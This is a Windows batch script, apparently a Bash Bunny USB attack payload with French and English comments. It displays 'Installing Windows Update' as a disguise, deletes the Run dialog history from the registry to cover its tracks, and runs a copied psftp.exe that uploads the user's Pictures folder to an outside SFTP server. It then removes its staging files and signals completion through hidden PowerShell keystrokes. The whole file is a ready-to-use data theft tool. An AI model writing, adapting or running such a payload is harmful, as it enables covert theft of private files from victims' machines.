@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
rem mettre des guillemets pour le mot de passe !
rem mettre une redirection > C:\Temp\test.txt pour debug
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
SET sftphost=IP.IP.IP.IP
SET sftpuser=XXXX
SET sftppass="XXXX"
SET sftpport=31569
SET lootfrom=%userprofile%\Pictures
SET looto=/ftp
SET unique=%RANDOM%
REM Creation du ftp
@echo lcd "%lootfrom%" >%TEMP%\test2.txt
@echo cd "%looto%" >>%TEMP%\test2.txt
@echo mkdir %computername%_%unique% >>%TEMP%\test2.txt
@echo cd %computername%_%unique% >>%TEMP%\test2.txt
@echo mput -r *. >>%TEMP%\test2.txt
@echo quit >>%TEMP%\test2.txt
REM Vous trouverez ci-dessous la copie d’un répertoire contenant une charge dans le répertoire racine du périphérique de stockage de masse Bash Bunny USB.
REM echo d | xcopy /C /Q /Y /E %~dp0\..\..\PAYLOAD_FOLDER_IN_ROOT %TEMP%\PAYLOAD_FOLDER_IN_ROOT

REM Copy payload.exe from the root of the bash Bash Bunny USB Mass Storage (change to whatever you like).
rem le psftp.exe doit être dans \payloads\library\sFTP Directory Grabber
copy %~dp0\psftp.exe "%TEMP%\psftp.exe"
rem copy %~dp0\.ssh "%userprofile%"

REM Below is for executing a payload inside a directory (see comments above). Change --startup to whatever parameters you wish to pass (or remove it).
REM start "" "%TEMP%\PAYLOAD_FOLDER_IN_ROOT\payload.exe" --startup

REM Launch payload.exe with the startup parameter. Change --startup to whatever parameters you wish to pass (or remove it).
start /wait /min "" "%TEMP%\psftp.exe" %sftphost% -l %sftpuser% -P %sftpport% -pw %sftppass% -b "%TEMP%\test2.txt" < %~dp0\yes.txt
REM Clean Up payload parameter files
DEL %TEMP%\psftp.exe /q
DEL %TEMP%\test2.txt /q
REM Blink CAPSLOCK key (from usb_exfiltrator)
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
